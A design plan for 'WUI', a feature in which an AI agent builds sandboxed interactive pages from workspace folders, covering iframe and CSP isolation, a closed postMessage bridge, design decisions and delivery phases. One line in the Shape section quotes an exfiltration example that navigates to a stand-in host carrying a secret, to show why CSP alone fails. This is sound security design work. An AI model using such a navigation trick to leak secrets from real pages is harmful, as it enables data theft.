# Plan — WUI

A **WUI** is a folder in an item's workspace that renders as a live, interactive
page. A domain expert describes what they need, the agent writes the folder, and
the page is usable in the item immediately.

The name is deliberately unfamiliar. Calling it "a web page" tells a domain
person *"that is a software engineer's job"* — the exact association this is
meant to break. WUI is a new word so it gets a new mental slot, and it is
written **WUI** in the UI, as a proper noun.

## Why

Today: the people who understand the domain do not write software, and the people
who write software do not understand the domain. They meet through a URD, and the
delivery date is whatever the engineering schedule allows. Requests that are not
important enough **starve**.

WUI moves that class of work off the engineering schedule. The engineer's output
shifts from *building the application* to *publishing the capability* (a tool) —
they do that once, and N domain experts assemble pages on top of it. If every WUI
still needed an engineer, the bottleneck would only have moved, not gone.

**Success is not "a WUI renders."** It is: one real request that would have
starved, built by someone who does not write software, and still in use a while
later. That is the bar the phases below are scoped against.

## Shape

```
銷售儀表板/                 ← the WUI (a folder, nothing registers it)
  page.ai.yaml            ← `view: wui` — the marker AND the declaration
  index.html              ← the entry
  app.js  style.css       ← inlined at render time
```

Opening `page.ai.yaml` renders the page. It is a `*.ai.yaml` view like
`board.ai.yaml`, so it needs no new file-tree concept, no registry and no
"publish" step — it is simply there, and clicking it runs it.

```
┌─ workspace pane ───────────────────────────────┐
│  [↻ refresh]  [⌖ report]                       │
│ ┌─ iframe: sandbox="allow-scripts", NO         │
│ │  allow-same-origin ⇒ origin is `null`        │
│ │  + injected CSP: default-src 'none'          │
│ │  + injected runtime (ours, always present)   │
│ │                                              │
│ │      the agent's HTML / CSS / JS             │
│ └──────────── postMessage ─────────────────────┤
│                    │  the ONLY way out         │
│  bridge (parent) ──┴─► existing HTTP routes    │
│                    └─► callTool ─► sandbox     │
└────────────────────────────────────────────────┘
```

The browser, not our code, enforces the boundary: a null-origin frame cannot read
cookies, cannot touch the parent DOM, and cannot fetch our API. `postMessage` is
the only channel, so the parent is the gate.

**CSP blocks the network, not inlining.** The page is one self-contained
document, so inline script/style must be allowed or nothing runs. What is taken
away is *reaching out*. This matters more than it first looks: CORS would still
let a request **leave** a null origin (it only withholds the response), so
"cannot read the answer" is not "cannot exfiltrate". `default-src 'none'` with no
`connect-src` of its own is what actually closes it.

**And it is not enough on its own.** CSP has no directive a document can use to
stop ITSELF navigating — `navigate-to` was dropped from CSP3 and never shipped —
so `location.href = "https://x/?d=" + secret` walked past every clause above,
measured in Chromium with fetch, beacon, WebSocket, image, popup, nested frame
and form submission all confirmed refused. The close is `SPA_CSP`'s `frame-src`
on the CONTAINING document (`api/spa.py`), the only actor with a say over a
child frame's navigation. It also removes the second half of the same hole: a
navigated-away frame keeps its `WindowProxy`, so the parent's replies —
necessarily `postMessage(…, "*")`, since an opaque origin cannot be named —
would have been handed to whatever then occupied it.

## Locked decisions

Each of these was argued and settled; the reason is the part worth keeping.

1. **Inside the platform, for signed-in users, inside one item.** Not a public
   URL. Anonymous access would need a second auth story and would point an
   LLM-written page at the open internet.
2. **Only "layer 1": open it from the file tree.** No tab-bar entry, no promotion
   into `profiles/default/`. A WUI lives in the item that made it and does not
   propagate. Copying a folder elsewhere later stays possible precisely because
   nothing registers it.
3. **State lives in workspace files.** Not a private store: what the page writes,
   the agent can read on its next turn, and the human can see in the tree. A page
   with its own invisible storage would kill "ask the AI to change it", which is
   the entire reason to do this here.
4. **Reads the whole item workspace; writes and deletes only its own folder.**
   Read broadly (secondary analysis of the item's real data is a first-class use);
   write narrowly, so a page cannot overwrite `notes.md` or the folder next door.
   A view file at the workspace **root** has no folder of its own, and the honest
   reading of "only its own folder" is then *nothing*: it can read, and every
   write is refused. Treating it as the whole workspace — which is what shipped
   first, with a test pinning it — deleted the invariant for exactly the case a
   hand-written view file reaches.
5. **A folder is a WUI iff it contains a `*.ai.yaml` with `view: wui`.** Inferring
   from "has an `index.html`" would misfire on a downloaded page or an exported
   report. Explicit opt-in, and the yaml is where the declaration lives — so no
   `<meta>` parsing and no second manifest format beside `app.json`.
6. **Capability ceiling is `app.json`, per tool, opt-in.** Enabling a new external
   system is legitimately engineering work; the tool has to exist anyway, so
   naming it in `app.json` costs nothing extra. The bottleneck being broken is
   *building applications*, not *onboarding external systems*.
7. **The bridge has seven verbs and the set is CLOSED.** `listFiles` `readFile`
   `writeFile` `deleteFile` `openFile` `whoami` go to the HTTP routes the FE
   already calls; `callTool` is the one new execution path. **Every future
   capability arrives through `callTool`**, so the bridge never grows and the
   security surface stays a fixed size.
   - `deleteFile` is granted because **write already subsumes destruction** in the
     same scope (overwrite with nothing). Refusing delete removes no risk and
     leaves a page unable to clean up files it created, which only grows quota.
   - **The agent's BUILT-IN tools are not reachable** (`read_file`, `exec`, …).
     Not "first-party", which in this codebase names the bundled `sample-tools`
     packages — those ARE reachable. And not for semantic reasons, which a
     whitelist could fix, but for *type* reasons: `read_file_impl` truncates by
     line and char budget, appends `[truncated: …]` **to the data**, returns
     errors as prose (`"error: file not found: …"`), and decodes with
     `errors="replace"`. Those are correct choices for an LLM and wrong for a
     program: a page reading its own `data.json` gets JSON that fails to parse,
     or worse, parses with half the rows.
   - **One facade, several faces.** A tool is the LLM's face of a capability; an
     HTTP route is the UI's face; `mcp_runner` is the MCP face. A WUI is a
     program, so it takes the program's face.
8. **`callTool` reaches tools that go through the package contract**
   (`PackageInfo`) — today `sample-tools/` plus third-party, tomorrow MCP. Defined
   by contract, never by provenance, so retiring second-party tools changes
   nothing here and leaves no special case behind.
9. **No auto-reload and no push.** Code changes do not reload the page; a refresh
   button rebuilds the iframe. But **`file_changed` IS forwarded into the frame**,
   because that event is already the platform's "someone else edited" cue — a
   page that is an editor and never hears it will silently overwrite other
   people's work. Forwarding is not reloading: the page decides what to do,
   because only it knows about the half-filled form. Conflicts stay
   **last-write-wins**, as everywhere else in the platform.
10. **No babysitting.** No write throttling, no tool-call concurrency limit. A
    wasteful WUI is visible, attributable, and fixable by fixing the WUI. Building
    machinery for an unmeasured problem is inferring a defect from call counts.
    **Guardrails only cover what a user cannot fix by editing their page**: the
    CSP (both of them), the folder write scope, and the capability declaration.
    One bound sits on OUR side of the line and belongs there — the pane keeps at
    most `MAX_REPORTS` reports. That is not policing how well the page runs; an
    unbounded list re-rendered per message freezes the whole workspace, including
    the button that would clear it, so the thing being protected is the app
    around the page, not the page.
11. **The agent learns WUI from a shared skill, not the system prompt.** A skill
    is a folder (`SKILL.md` + `references/` + a complete runnable example) whose
    body loads on demand, so a turn that never mentions WUI pays two lines. The
    example is deliberately an **editor**, the shape that trips on every hazard
    at once (debounce, `file_changed`, folder scope) — copying beats generating
    for small local models.
    - The list of tools this app exposes to `callTool` is **dynamic** and cannot
      live in the skill. The model cannot tell `data-fetch` from `read_file` by
      name, so the host names the WUI-callable set explicitly, appended to the
      skill body at read time (`describe_wui_tools`) off the SAME resolved
      packages and allow-list the turn's toolset was built from. Where a caller
      has no resolved toolset to ask, the section is omitted rather than rendered
      empty: "this app grants none" and "nobody asked" are different claims.
12. **Errors are caught by our injected runtime, never by the agent's code.** A
    blank page is where "the domain expert does it themselves" breaks: they cannot
    open a console, and the agent cannot see the browser. The runtime catches
    `window.onerror`, unhandled rejections and every bridge refusal, shows them in
    the pane in plain language, and offers one button that hands the text to the
    agent. A bridge refusal must therefore read as a sentence, not a `false`.
13. **A pick mode, on the same injected runtime.** The user circles the part that
    looks wrong and it goes to the agent with their comment. Because the parent
    cannot reach into a null-origin frame, this can *only* be done from inside,
    and the only trustworthy code inside is ours. It sends the element's
    `outerHTML`, its `getBoundingClientRect`, and key computed styles — the last
    is what lets a model reason about "it looks squashed" at all. **No screenshot**
    (needs a library the CSP will not let us fetch) and **no source map** (the
    content is JS-generated; the agent wrote the folder and can find it).
14. **WUI knows about files, not entities.** Entities are an App-level concept —
    PM has plenty of special rules and they live inside PM. WUI is general, so
    coupling it to entities would make it "good in apps that have entities". A
    frontmatter helper belongs in the skill's example, or in an App's own skill.
15. **Discovery is deliberately deferred** until the trial. The skill is
    registered in `SHARED_SKILLS` but declared by **no app** — an app opts in
    with one line in its `agent.skills` when it is ready. Declaring it and
    switching it off is a real alternative (a profile can pin a `skills` list, as
    `pm` already does) and was rejected for a different reason than first written
    down: a declared skill puts a row named `wui` in every item's skill picker,
    which is precisely the finding-out being deferred. The cost is that enabling
    it later is an `app.json` line rather than a per-item toggle. No feature flag,
    nothing to remove. Note the asymmetry: the renderer ships to everyone, so a
    hand-written `view: wui` file already works, and `read_skill("wui")` resolves
    in any app. What is gated is whether the *agent* is TOLD, not whether the
    platform can run one.

## Phases

Flat integers, one commit each. Two sequences, because the work landed as two
pull requests — a commit's `P<n>` is a phase of ITS pull request.

- **P1 — render.** `assemble.ts` (pure: inline the folder's relative refs, inject
  the CSP), the `wui` kind reserved and branched ahead of the entity dispatcher
  (the same route `health` takes, because it needs the file path and wants full
  bleed), and the iframe. Outcome: a hand-written folder renders and runs.
- **P2 — bridge, six verbs.** `postMessage` protocol + the parent dispatcher over
  `FileService`, with the folder write/delete scope (and `..` escapes refused).
  Outcome: a page can read the workspace and persist its own state.
- **P3 — runtime.** Injected error capture + pick mode, the pane's refresh /
  report buttons, and handing a report to the agent. Outcome: a broken page is
  reportable by someone who cannot open a console.
- **P4 — `callTool`.** An item-scoped execution route for package tools, gated by
  the yaml declaration ∩ the `app.json` ceiling. Outcome: external integration.
- **P5 — skill.** `sample-skills/wui/` with the editor example and the reference.
  Outcome: the agent can build one from a plain-language request.

`file_changed` forwarding (decision 9) rides with P2, since it is the same
channel and an editor without it is unsafe.

### PR #769 — the first five

The five above.

### PR #773 — pages that have a build

P1–P5 assumed the files in the folder ARE the page. Once a page can be written
with a bundler that stops being true — the folder holds `src/` (edited) and
`dist/` (rendered), and nothing keeps them together. A `src/` edit with no
rebuild leaves the reader looking at the old page with nothing saying why, which
is the only SILENT failure on this path.

A staleness warning was designed and then dropped: telling someone their page
might be out of date is worse than either rebuilding it or leaving it alone.

- **P1 — the build route.** `POST …/wui/build`, streaming the build's own output
  as SSE. `package.json`'s `scripts.build` decides what a build is (a command
  named in the view file would let an LLM-written page choose what a human's
  click executes); the verb is `execute`, the same one a notebook cell needs.
- **P2 — a build that survives a recycle.** `node_modules/` is not mirrored, so
  the build installs first — `--frozen-lockfile` where there is a lock. Without
  this, the first click after a recycle fails and the remedy is "get someone to
  run pnpm install", which is the friction a WUI exists to remove.
- **P3 — the pane.** A **Rebuild** button for pages that have a build, the log on
  screen while it runs, and an **Auto-rebuild** switch — on by default,
  per page and per viewer, turning itself off for a viewer a 403 says may not run
  things here. Rebuilding on open is what closes the gap for everyone who opens
  the page — not a guarantee, since the manifest read may fail quietly and a
  failed build leaves the old `dist/` up; it is a choice because the cost (a
  sandbox waking, tens of seconds) is real.
- **P4 — the claim ledger.** The skill, the react example's README and
  `docs/wui.md` all said the AI rebuilding in the same turn was the only defence.
  It is still worth doing — the automatic build protects the next person to OPEN
  the page, not the one already looking at it — but it is no longer the only one.

The rest of this sequence was not planned. Each phase is something that only
appeared once the thing was USED — pressed in a browser, or looked at in a
screenshot — which is the argument for doing that before calling a feature done.

- **P5 — what the first real Rebuild found.** Four defects, none visible to a
  test: the build ran in the wrong directory (`exec`'s cwd is the workspace
  root, so a workspace-absolute path names the filesystem root); the sandbox had
  no pnpm; the jail's PATH omitted `/usr/local/bin`, where an image installs
  one; and the log printed the build's ANSI colour codes as literal text.
- **P6 — the built example had no stylesheet.** It rendered as browser defaults
  and asked for two class names nothing defined. Caught by someone looking at a
  screenshot and asking whether it had any CSS at all.
- **P7 — opening and building at once showed a broken page.** The build's
  restore races the page's own reads, so `app.js` and `style.css` come back
  missing for a few seconds. The pane waits now. (The race itself is older and
  wider — see "Known and not fixed".)
- **P8 — a real charting library.** "No network" is about runtime: a UMD build
  in the folder is inlined, and the sandbox has a network to fetch it with, so
  `examples/chart/` makes fetching it the page's build step. Hand-drawing an
  SVG was never the answer, and the skill had never said so.
- **P9 — the log folds away when the build succeeds.** It earns the pane while
  it runs and while something is wrong; after that it is a receipt.
- **P10 — the toggle's label.** "on open" was two words nobody could read.

## Known and not fixed

- **Reads route to a sandbox that is not ready yet.** `files/facade.py`'s
  `_warm` probes that a sandbox EXISTS and never asks `is_ready`, so a read
  landing inside a restore window can answer "not there" over an intact durable
  snapshot — for the agent, the file tree and the entity lists, not only a WUI.
  `.ready` was added in #366 for exactly this ambiguity and the mirror honours
  it; reads do not. Wants its own change.
- **`kind: local` cannot run an npm script in a page's folder.** The sandbox
  directory is named after the item, and an item id contains a colon, so
  `<cwd>/node_modules/.bin` cannot be expressed on `PATH`. The hosted sandbox
  mints uuid directories and is unaffected.

## Deliberately not built

- Detecting staleness. Under "rebuild on open" there is nothing to detect, and a
  warning that a page MIGHT be old asks the reader to do the platform's job.
- Auto-reload, live data push, write throttling, tool concurrency limits (10).
- Screenshots and source maps in the pick report (13).
- Entity access from the bridge (14).
- Cross-item access, `exec`, and asking the agent from inside a page — the last
  would arrive as a tool if it ever does (7).
- Any second manifest format, registry, or "publish" action (2, 5).
